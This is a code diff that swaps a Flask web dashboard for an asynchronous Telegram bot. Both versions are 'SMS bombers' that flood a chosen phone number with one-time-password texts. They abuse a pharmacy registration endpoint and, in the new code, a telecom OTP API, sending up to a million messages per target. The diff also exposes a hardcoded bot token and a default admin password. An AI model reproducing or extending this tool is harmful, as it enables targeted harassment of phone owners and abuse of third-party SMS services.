@@ -1,306 +1,245 @@
-import requests
-import threading
-import os
+import asyncio
+import aiohttp
+import telebot
 import time
-import sqlite3
-import random
-from datetime import datetime, timedelta, timezone
-from concurrent.futures import ThreadPoolExecutor
-from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
-from werkzeug.security import generate_password_hash, check_password_hash
+import json
+import os
+import logging
+import psutil
+from telebot.async_telebot import AsyncTeleBot
+from telebot import types
+from aiohttp import web 
+from datetime import datetime
+import pytz
 
-app = Flask(__name__)
-app.secret_key = os.urandom(32)
+# --- CONFIGURATION ---
+API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
+ADMIN_ID = 6048050987  
+TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
+WAKEUP_URL = "https://rkbombx.onrender.com" 
+DB_FILE = "rk_users_v15.json"
+HISTORY_FILE = "rk_history_v15.json"
+SYSTEM_STATS_FILE = "rk_system_stats.json"
 
-# ---------- [FEATURE: BST BD TIME ZONE] ----------
-def get_bd_time():
-    return datetime.now(timezone(timedelta(hours=6)))
+logging.basicConfig(level=logging.INFO)
+bot = AsyncTeleBot(API_TOKEN)
+TZ = pytz.timezone('Asia/Dhaka')
 
-# ---------- [DATABASE SETUP] ----------
-def get_db():
-    conn = sqlite3.connect('rk_v24_premium.db', check_same_thread=False)
-    conn.row_factory = sqlite3.Row
-    return conn
+# Global Variables
+active_attacks = {}  
+user_states = {}
+authorized_users = {ADMIN_ID}
+attack_history = []
+global_sms_count = 0
 
-def init_db():
-    with get_db() as conn:
-        conn.execute('''CREATE TABLE IF NOT EXISTS history (
-            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
-            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
-            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
-            date_str TEXT, timestamp DATETIME)''')
-        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
-        try:
-            # Default Admin: admin | Password: JaNiNaTo-330
-            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("JaNiNaTo-330"), "active"))
-        except: pass
-
-init_db()
-
-# ---------- [CORE TURBO ENGINE] ----------
-active_sessions = {}
-
-def send_request(phone):
-    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]
+# --- DATA PERSISTENCE ---
+def load_all_data():
+    global authorized_users, attack_history, global_sms_count
     try:
-        res = requests.get(random.choice(api_list).format(phone), timeout=6)
-        return res.status_code == 200
-    except: return False
+        if os.path.exists(DB_FILE):
+            with open(DB_FILE, "r") as f: authorized_users = set(json.load(f))
+        if os.path.exists(HISTORY_FILE):
+            with open(HISTORY_FILE, "r") as f: attack_history = json.load(f)
+        if os.path.exists(SYSTEM_STATS_FILE):
+            with open(SYSTEM_STATS_FILE, "r") as f:
+                stats = json.load(f)
+                global_sms_count = stats.get("total_sent", 0)
+    except Exception as e:
+        logging.error(f"Data loading error: {e}")
 
-def bombing_task(username, phone, limit, start_dt):
-    key = f"{username}_{phone}"
-    with ThreadPoolExecutor(max_workers=5) as executor:
-        while key in active_sessions:
-            curr = active_sessions[key]
-            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
-            if curr['status'] == 'Running':
-                now = get_bd_time()
-                elapsed = now - start_dt
-                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
-                if executor.submit(send_request, phone).result():
-                    active_sessions[key]['success'] += 1
-                else: active_sessions[key]['fail'] += 1
-                active_sessions[key]['total'] += 1
-                if active_sessions[key]['total'] > 1:
-                    avg = elapsed.total_seconds() / active_sessions[key]['total']
-                    active_sessions[key]['eta'] = str(timedelta(seconds=int(avg * (limit - active_sessions[key]['total']))))
-                time.sleep(0.15)
-            else: time.sleep(1)
+def save_data():
+    try:
+        with open(DB_FILE, "w") as f: json.dump(list(authorized_users), f, indent=4)
+        with open(HISTORY_FILE, "w") as f: json.dump(attack_history[-100:], f, indent=4)
+        with open(SYSTEM_STATS_FILE, "w") as f: json.dump({"total_sent": global_sms_count}, f, indent=4)
+    except Exception as e:
+        logging.error(f"Data saving error: {e}")
 
-    stop_dt = get_bd_time()
-    s = active_sessions.get(key)
-    if s and s['status'] != 'Paused':
-        with get_db() as conn:
-            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
-                (username, phone, s['success'], s['fail'], s['total'], limit, "Completed", s['start_time'], stop_dt.strftime("%I:%M %p"), s['running_time'], start_dt.strftime("%d/%m/%Y"), start_dt))
-        del active_sessions[key]
-
-# ---------- [HACKER THEME PREMIUM UI] ----------
-LAYOUT = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-V24 PREMIUM SYSTEM</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Source+Code+Pro:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        :root { --neon: #00ffcc; --bg: #020202; --card: #0a0a0a; --red: #ff003c; --blue: #00d2ff; --gold: #f39c12; --purple: #9b59b6; }
-        * { box-sizing: border-box; }
-        body { background: var(--bg); color: #e0e0e0; font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
-        
-        /* DOOR ANIMATION (Only shown first time) */
-        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: none; }
-        .door { width: 50%; height: 100%; background: #000; position: absolute; transition: 1.5s cubic-bezier(0.7, 0, 0.3, 1); border: 1px solid var(--neon); }
-        .left-door { left: 0; border-right: 2px solid var(--neon); }
-        .right-door { right: 0; border-left: 2px solid var(--neon); }
-        .loaded .left-door { transform: translateX(-100%); }
-        .loaded .right-door { transform: translateX(100%); }
-        .loaded #loader { visibility: hidden; pointer-events: none; }
-
-        /* RGB BANNER */
-        .rk-banner {
-            max-width: 550px; margin: 20px auto; padding: 10px;
-            background: #000; border: 2.5px solid var(--neon); border-radius: 15px;
-            position: relative; overflow: hidden; text-align: center;
-        }
-        .rk-banner h1 {
-            font-family: 'Orbitron'; font-weight: 900; font-size: 2.5rem; margin: 0;
-            background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
-            background-size: 400%; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            animation: flow 4s linear infinite; letter-spacing: 5px;
-        }
-        @keyframes flow { 0%{background-position:0% 50%} 100%{background-position:100% 50%} }
-
-        #canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
-        .nav { background: rgba(0,0,0,0.9); padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; backdrop-filter: blur(10px); }
-        .logo { font-family: 'Orbitron'; font-weight: 900; color: var(--neon); text-shadow: 0 0 15px var(--neon); }
-        
-        .container { padding: 30px 15px; max-width: 550px; margin: auto; animation: zoomIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        @keyframes zoomIn { from { transform: scale(0.6); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-        
-        .monitor-frame { position: relative; background: #000; border-radius: 20px; padding: 2px; overflow: hidden; margin-bottom: 30px; }
-        .monitor-frame::before { content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(transparent, var(--neon), var(--blue), var(--purple), var(--neon)); animation: rotate 4s linear infinite; }
-        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        .monitor-content { position: relative; background: var(--card); border-radius: 18px; padding: 25px; z-index: 2; }
-
-        input { width: 100%; padding: 16px; margin: 12px 0; background: rgba(0,0,0,0.5); border: 1px solid #222; color: var(--neon); border-radius: 12px; font-family: 'Source Code Pro'; font-size: 14px; outline: none; border-left: 4px solid var(--neon); }
-        .btn-turbo { background: linear-gradient(135deg, var(--neon), var(--blue)); color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
-
-        .three-dot { cursor: pointer; padding: 10px; }
-        .dot { height: 5px; width: 5px; background: var(--neon); border-radius: 50%; display: block; margin: 4px; }
-        .menu-dropdown { position: absolute; right: 20px; top: 75px; background: var(--card); border: 1px solid var(--neon); border-radius: 8px; width: 240px; display: none; z-index: 2000; }
-        .menu-dropdown a { display: block; padding: 15px 20px; color: #fff; text-decoration: none; font-size: 10px; border-bottom: 1px solid #1a1a1a; }
-
-        .btn-ctrl { padding: 10px; border-radius: 8px; border: none; font-family: 'Orbitron'; font-size: 10px; cursor: pointer; flex: 1; font-weight: bold; }
-        .bg-pause { background: var(--gold); color: #000; }
-        .bg-stop { background: var(--red); color: #fff; }
-        .c-neon { color: var(--neon); } .c-blue { color: var(--blue); } .c-red { color: var(--red); } .c-gold { color: var(--gold); }
-    </style>
-</head>
-<body onclick="document.getElementById('mBox').style.display='none'">
-    <div id="loader">
-        <div class="door left-door"></div>
-        <div class="door right-door"></div>
-        <audio id="hack_sound" src="https://www.soundjay.com/communication/typing-6-slow.mp3" preload="auto"></audio>
-    </div>
-
-    <canvas id="canvas"></canvas>
-    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>
-    
-    <div class="rk-banner"><h1>RK-SYSTEM</h1></div>
-
-    <nav class="nav">
-        <div class="logo" onclick="location.href='/dashboard'">RK-SYSTEM V24</div>
-        <div class="three-dot" onclick="event.stopPropagation(); let m=document.getElementById('mBox'); m.style.display=(m.style.display==='block'?'none':'block')">
-            <span class="dot"></span><span class="dot"></span><span class="dot"></span>
-        </div>
-    </nav>
-
-    <div class="menu-dropdown" id="mBox">
-        <a href="/history">01. ALL HISTORY</a>
-        <a href="/running-logs">02. RUNNING MISSIONS</a>
-        <a href="/last-attack">03. LAST ATTACK</a>
-        <a href="/profile">04. PROFILES</a>
-        <a href="/logout" style="color:var(--red);">!! LOGOUT</a>
-    </div>
-
-    <div class="container">[CONTENT]</div>
-
-    <script>
-        // Check if first time loading
-        if (!sessionStorage.getItem('animated')) {
-            document.getElementById('loader').style.display = 'flex';
-            const sound = document.getElementById('hack_sound');
-            sound.play().catch(() => { /* Auto-play protection */ });
-            
-            setTimeout(() => {
-                document.body.classList.add('loaded');
-                sessionStorage.setItem('animated', 'true');
-            }, 2000); // 2 Seconds
-        }
-
-        // MATRIX BACKGROUND
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        const fontSize = 14;
-        const drops = Array(Math.floor(canvas.width/fontSize)).fill(1);
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00ffcc'; ctx.font = fontSize + 'px Orbitron';
-            for (let i = 0; i < drops.length; i++) {
-                ctx.fillText(letters.charAt(Math.floor(Math.random()*letters.length)), i*fontSize, drops[i]*fontSize);
-                if (drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        setInterval(drawMatrix, 50);
-
-        function sync() {
-            let area = document.getElementById('live-engine'); if(!area) return;
-            fetch('/api/status').then(r=>r.json()).then(data=>{
-                let html = '';
-                for(let k in data){
-                    let s = data[k]; let p = (s.total/s.limit)*100;
-                    html += `<div class="monitor-frame"><div class="monitor-content">
-                        <div style="display:flex; justify-content:space-between; border-bottom:1px solid #222; padding-bottom:10px;">
-                            <b class="c-blue">TARGET: ${s.phone}</b>
-                            <span style="color:var(--neon); font-size:11px; font-weight:bold;">● ${s.status}</span>
-                        </div>
-                        <div style="height:8px; background:#111; border-radius:10px; margin:20px 0; overflow:hidden;">
-                            <div style="height:100%; background:linear-gradient(90deg, var(--neon), var(--blue)); width:${p}%"></div>
-                        </div>
-                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; text-align:center;">
-                            <div><span>SUCCESS</span><br><b class="c-neon">${s.success}</b></div>
-                            <div><span>FAIL</span><br><b class="c-red">${s.fail}</b></div>
-                        </div>
-                        <div style="display:flex; gap:10px; margin-top:15px;">
-                            <button class="btn-ctrl bg-pause" onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'">${s.status==='Running'?'PAUSE':'RESUME'}</button>
-                            <button class="btn-ctrl bg-stop" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
-                        </div>
-                    </div></div>`;
-                } area.innerHTML = html;
-            });
-        } setInterval(sync, 1500);
-    </script>
-</body></html>
-'''
-
-# ---------- [ROUTES] ----------
-@app.route('/')
-def root(): return redirect(url_for('login'))
-
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        u, p = request.form.get('u'), request.form.get('p')
-        with get_db() as conn:
-            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
-        if user and check_password_hash(user['password'], p):
-            session['user'] = u; return redirect(url_for('dashboard'))
-    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3 class="c-neon">SYSTEM AUTH</h3><form method="POST"><input name="u" placeholder="Operator ID" required><input name="p" type="password" placeholder="Access Key" required><button class="btn-turbo">ENTER SYSTEM</button></form><p style="font-size:12px; margin-top:15px;">New Operator? <a href="/register" class="c-blue">Register</a></p></div></div>'))
-
-@app.route('/register', methods=['GET', 'POST'])
-def register():
-    if request.method == 'POST':
-        u, p = request.form.get('u'), request.form.get('p')
-        with get_db() as conn:
+# --- RENDER ALIVE & HEALTH ---
+async def keep_alive():
+    async with aiohttp.ClientSession() as session:
+        while True:
             try:
-                conn.execute("INSERT INTO users VALUES (?, ?, ?)", (u, generate_password_hash(p), "active"))
-                return redirect(url_for('login'))
+                async with session.get(WAKEUP_URL) as resp:
+                    logging.info(f"Pulse Sent: {resp.status}")
             except: pass
-    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3 class="c-blue">REGISTRATION</h3><form method="POST"><input name="u" placeholder="Set ID" required><input name="p" type="password" placeholder="Set Key" required><button class="btn-turbo">CREATE ACCOUNT</button></form><p style="font-size:12px; margin-top:15px;"><a href="/login" class="c-neon">Back to Login</a></p></div></div>'))
+            await asyncio.sleep(300)
 
-@app.route('/dashboard')
-def dashboard():
-    if 'user' not in session: return redirect(url_for('login'))
-    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content"><h3 class="c-neon">🚀 MISSION CONTROL</h3><form action="/api/start"><input name="num" type="tel" inputmode="numeric" placeholder="Phone Number" autocomplete="on" required><input name="amt" type="number" inputmode="numeric" placeholder="Hit Amount" required><button class="btn-turbo" onclick="document.getElementById(\'snd_start\').play()">LAUNCH ATTACK</button></form></div></div><div id="live-engine"></div>'))
+async def handle_health_check(request):
+    return web.Response(text="<h1>RK BOT IS RUNNING STYLISHLY! 🚀</h1>", content_type='text/html')
 
-@app.route('/history')
-def history():
-    if 'user' not in session: return redirect(url_for('login'))
-    with get_db() as conn: logs = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_ok FROM history GROUP BY phone ORDER BY id DESC").fetchall()
-    html = '<h3 class="c-blue">📂 DATABASE HISTORY</h3>'
-    for l in logs:
-        html += f'<div class="monitor-frame" onclick="location.href=\'/history/{l["phone"]}\'"><div class="monitor-content" style="cursor:pointer; display:flex; justify-content:space-between; align-items:center;"><div><b class="c-gold">{l["phone"]}</b><br><small>Sessions: {l["sessions"]}</small></div><b class="c-neon">{l["total_ok"]} OK</b></div></div>'
-    return render_template_string(LAYOUT.replace('[CONTENT]', html))
+async def start_health_server():
+    app = web.Application()
+    app.router.add_get('/', handle_health_check)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.environ.get("PORT", 8080))
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
 
-@app.route('/history/<num>')
-def history_detail(num):
-    if 'user' not in session: return redirect(url_for('login'))
-    with get_db() as conn: logs = conn.execute("SELECT * FROM history WHERE phone=? ORDER BY id DESC", (num,)).fetchall()
-    html = f'<h3>📜 LOGS: {num}</h3>'
-    for l in logs:
-        html += f'<div class="monitor-frame"><div class="monitor-content">DATE: {l["date_str"]} | SUCCESS: <b class="c-neon">{l["success"]}</b><br>STATUS: {l["status"]}</div></div>'
-    return render_template_string(LAYOUT.replace('[CONTENT]', html))
+# --- UI HELPERS ---
+def get_main_menu():
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    markup.add("🚀 Start Attack", "📜 Attack History", "⏳ Running List", "💎 My Status", "📊 System Info", "📞 Support")
+    return markup
 
-@app.route('/api/start')
-def api_start():
-    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
-    if u and num and amt:
-        now = get_bd_time(); key = f"{u}_{num}"
-        active_sessions[key] = {'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00', 'eta': 'Calculating...'}
-        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
-    return redirect(url_for('dashboard'))
+def get_control_panel(chat_id, status, target=None):
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    p_text = "⏸ Pause" if status == "running" else "▶️ Resume"
+    p_callback = f"pau_{chat_id}" if status == "running" else f"res_{chat_id}"
+    markup.add(types.InlineKeyboardButton(p_text, callback_data=p_callback),
+               types.InlineKeyboardButton("⏹ Stop", callback_data=f"stp_{chat_id}"))
+    if status == "completed" and target:
+        markup.add(types.InlineKeyboardButton("🔄 Re-Attack", callback_data=f"re_{target}"))
+    return markup
 
-@app.route('/api/status')
-def api_status(): return jsonify({k: v for k, v in active_sessions.items() if k.startswith(session.get('user', ''))})
+# --- CORE ENGINE ---
+async def perform_sms(session, number, stats):
+    global global_sms_count
+    try:
+        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=10) as resp:
+            if resp.status == 200:
+                stats['ok'] += 1
+                global_sms_count += 1
+            else: stats['err'] += 1
+    except: stats['err'] += 1
+    stats['total'] += 1
 
-@app.route('/api/control')
-def api_control():
-    key = f"{session['user']}_{request.args.get('num')}"
-    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
-    return redirect(url_for('dashboard'))
+async def attack_orchestrator(chat_id, message_id, target, limit):
+    evt = asyncio.Event()
+    evt.set()
+    start_time = datetime.now(TZ)
+    active_attacks[chat_id] = {'event': evt, 'status': 'running', 'stop': False, 'target': target}
+    
+    stats = {'ok': 0, 'err': 0, 'total': 0}
+    
+    async with aiohttp.ClientSession() as session:
+        while stats['total'] < limit:
+            if active_attacks.get(chat_id, {}).get('stop'): break
+            if not evt.is_set(): await evt.wait()
+            
+            batch_size = 25 # High speed batch
+            batch = min(batch_size, limit - stats['total'])
+            tasks = [perform_sms(session, target, stats) for _ in range(batch)]
+            await asyncio.gather(*tasks)
+            
+            try:
+                # Calculations
+                prog = int((stats['total']/limit)*100)
+                bar_count = prog // 10
+                bar = "🔹" * bar_count + "▫️" * (10 - bar_count)
+                current_time = datetime.now(TZ)
+                elapsed = int((current_time - start_time).total_seconds())
+                
+                # Stylish Monitor
+                monitor_txt = (
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"📱 **Target:** `{target}`\n"
+                    f"📊 **Progress:** `{prog}%` {bar}\n"
+                    f"✅ **Success:** `{stats['ok']}`\n"
+                    f"❌ **Fail:** `{stats['err']}`\n"
+                    f"🔢 **Total Sent:** `{stats['total']}/{limit}`\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🕒 **Started:** `{start_time.strftime('%I:%M:%S %p | %d-%m-%Y')}`\n"
+                    f"⏳ **Running Time:** `{elapsed}s`\n"
+                    f"📡 **STATUS:** `{active_attacks[chat_id]['status'].upper()}`\n"
+                    f"━━━━━━━━━━━━━━━━━━━━"
+                )
+                
+                await bot.edit_message_text(monitor_txt, chat_id, message_id, 
+                                          reply_markup=get_control_panel(chat_id, active_attacks[chat_id]['status']),
+                                          parse_mode="Markdown")
+            except: pass
+            await asyncio.sleep(1)
 
-@app.route('/api/stop')
-def api_stop():
-    key = f"{session['user']}_{request.args.get('num')}"
-    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
-    return redirect(url_for('dashboard'))
+    active_attacks[chat_id]['status'] = 'completed'
+    attack_history.append({"target": target, "count": stats['ok'], "time": datetime.now(TZ).strftime('%d-%m %I:%M %p')})
+    save_data()
+    
+    final_msg = f"🏁 **ATTACK FINISHED** 🏁\n━━━━━━━━━━━━━━\n📱 Target: `{target}`\n✅ Successfully Sent: `{stats['ok']}`\n🚀 Bot: RK V15.2 PRO"
+    await bot.send_message(chat_id, final_msg, reply_markup=get_main_menu())
+    active_attacks.pop(chat_id, None)
 
-@app.route('/logout')
-def logout(): session.clear(); return redirect(url_for('login'))
+# --- HANDLERS ---
+@bot.message_handler(commands=['start'])
+async def start(m):
+    welcome = (f"🔥 **WELCOME TO RK BOMBING V15.2** 🔥\n\n"
+               f"বটটি এখন আগের চেয়ে অনেক দ্রুত এবং স্টাইলিশ।\n"
+               f"নিচের মেনু ব্যবহার করে অ্যাটাক শুরু করুন।")
+    await bot.send_message(m.chat.id, welcome, reply_markup=get_main_menu(), parse_mode="Markdown")
+
+@bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
+async def ask_num(m):
+    if m.chat.id not in authorized_users: 
+        return await bot.reply_to(m, "🚫 **Access Denied!**\nআপনার কাছে এই বট ব্যবহারের অনুমতি নেই।")
+    user_states[m.chat.id] = {"step": "num"}
+    await bot.send_message(m.chat.id, "📞 **টার্গেট নম্বর দিন (১১ ডিজিট):**", reply_markup=types.ReplyKeyboardRemove())
+
+@bot.message_handler(func=lambda m: m.chat.id in user_states and user_states[m.chat.id].get("step") == "num")
+async def get_num(m):
+    if len(m.text) == 11 and m.text.isdigit():
+        user_states[m.chat.id] = {"step": "limit", "target": m.text}
+        await bot.send_message(m.chat.id, "🔢 **আক্রমণের পরিমাণ দিন (Max 1,000,000):**")
+    else:
+        await bot.reply_to(m, "❌ **ভুল নম্বর!** সঠিক নম্বর দিন।")
+
+@bot.message_handler(func=lambda m: m.chat.id in user_states and user_states[m.chat.id].get("step") == "limit")
+async def get_lim(m):
+    try:
+        limit = int(m.text)
+        if limit > 1000000: limit = 1000000
+        target = user_states[m.chat.id]['target']
+        user_states.pop(m.chat.id)
+        
+        msg = await bot.send_message(m.chat.id, "⚡ **ইঞ্জিন প্রস্তুত হচ্ছে...**")
+        asyncio.create_task(attack_orchestrator(m.chat.id, msg.message_id, target, limit))
+    except:
+        await bot.reply_to(m, "⚠️ **শুধুমাত্র সংখ্যা লিখুন!**")
+
+@bot.message_handler(func=lambda m: m.text == "📊 System Info")
+async def sys_info(m):
+    cpu = psutil.cpu_percent()
+    ram = psutil.virtual_memory().percent
+    txt = (f"🖥 **SYSTEM ANALYTICS**\n━━━━━━━━━━━━━━\n"
+           f"⚡ **CPU Usage:** `{cpu}%` \n"
+           f"🧠 **RAM Usage:** `{ram}%` \n"
+           f"📨 **Total SMS Sent:** `{global_sms_count}`\n"
+           f"⏳ **Active Threads:** `{len(active_attacks)}` \n"
+           f"🚀 **Bot Status:** `OPTIMIZED` \n"
+           f"━━━━━━━━━━━━━━")
+    await bot.reply_to(m, txt, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda c: True)
+async def cb(c):
+    cid = c.message.chat.id
+    if c.data.startswith("pau_"):
+        if cid in active_attacks:
+            active_attacks[cid]['event'].clear()
+            active_attacks[cid]['status'] = "paused"
+            await bot.answer_callback_query(c.id, "Paused ⏸")
+    elif c.data.startswith("res_"):
+        if cid in active_attacks:
+            active_attacks[cid]['event'].set()
+            active_attacks[cid]['status'] = "running"
+            await bot.answer_callback_query(c.id, "Resumed ▶️")
+    elif c.data.startswith("stp_"):
+        if cid in active_attacks:
+            active_attacks[cid]['stop'] = True
+            active_attacks[cid]['event'].set()
+            await bot.answer_callback_query(c.id, "Attack Stopped ⏹")
+
+# --- MAIN RUNNER ---
+async def main():
+    load_all_data()
+    print("Bot is starting...")
+    await asyncio.gather(
+        start_health_server(),
+        keep_alive(),
+        bot.polling(non_stop=True)
+    )
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=54300)
+    try:
+        asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit):
+        pass
